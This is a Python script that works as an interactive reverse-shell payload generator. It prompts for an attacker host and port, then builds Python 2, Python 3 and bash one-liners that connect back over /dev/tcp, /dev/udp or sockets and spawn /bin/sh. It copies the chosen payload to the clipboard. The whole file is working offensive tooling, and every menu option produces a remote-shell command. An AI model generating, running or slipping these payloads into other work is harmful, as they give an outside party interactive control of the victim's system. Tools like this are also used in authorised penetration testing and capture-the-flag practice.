#!/usr/bin/env python3
import pyperclip as clip
import os

def menu():
    print('''
    ________MENU_________
    \n1. Python \n2. BASH\n9. Exit
          ''')

def pymenu():
    print('''
    ________MENU_________
    \n1. Python 2.7 \n2. Python 2.7 W/ Exports \n3. Python 3\n4. Python 3 W/ Exports \n9. Back to Main Menu
          ''')

def pysubprocess():
    selectShell = int(input("Select Shell: "))
    if selectShell == 1:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        shell ="""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""".format(rhost, port)
        print(shell)
        clip.copy(shell)
        print("\n Copied to Clipboard!")
        exit()
    if selectShell == 2:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        shell ="""export RHOST="{0}";export RPORT={1};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'""".format(rhost, port)
        print(shell)
        clip.copy(shell)
        print("\n Copied to Clipboard!")
        exit()
    if selectShell == 3:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        shell ="""python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""".format(rhost, port)
        print(shell)
        clip.copy(shell)
        print("\n Copied to Clipboard!")
        exit()
    if selectShell == 4:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        shell ="""export RHOST="{0}";export RPORT={1};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'""".format(rhost, port)
        print(shell)
        clip.copy(shell)
        print("\n Copied to Clipboard!")
        exit()
    elif selectShell == 9:
        main()
    else:
        os.system("clear")
        pymenu()
        pysubprocess()

def bashmenu():
    print('''
    ________MENU_________
    \n1. BASH -i \n2. BASH 196 \n3. BASH -i 5 \n4. BASH -i UDP \n9. Back to Main Menu
          ''')

def bashsubprocess():
    selectShell = int(input("Select Shell: "))
    if selectShell == 1:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        shell = "sh -i >& /dev/tcp/{0}/{1} 0>&1".format(rhost, port)
        print(shell)
        clip.copy(shell)
        print("Copied to Clipboard!")
        exit()
    if selectShell == 2:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        shell = "0<&196;exec 196<>/dev/tcp/{0}/{1}; sh <&196 >&196 2>&196".format(rhost, port)
        print(shell)
        clip.copy(shell)
        print("Copied to Clipboard!")
        exit()
    if selectShell == 3:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        shell = "sh -i 5<> /dev/tcp/{0}/{1} 0<&5 1>&5 2>&5".format(rhost, port)
        print(shell)
        clip.copy(shell)
        print("Copied to Clipboard!")
        exit()
    if selectShell == 4:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        shell = "sh -i >& /dev/udp/{0}/{1} 0>&1".format(rhost, port)
        print(shell)
        clip.copy(shell)
        print("Copied to Clipboard!")
        exit()
    elif selectShell == 9:
        main()
    else:
        os.system("clear")
        bashmenu()
        bashsubprocess()


def main():
    os.system("clear")
    menu()
    selectLib = int(input("Select Library: "))
    
    if selectLib == 1:
        os.system("clear")
        pymenu()
        pysubprocess()
    elif selectLib == 2:
        os.system("clear")
        bashmenu()
        bashsubprocess()
    elif selectLib == 9:
        exit()
    else:
        main()

if __name__ == "__main__":
    main()
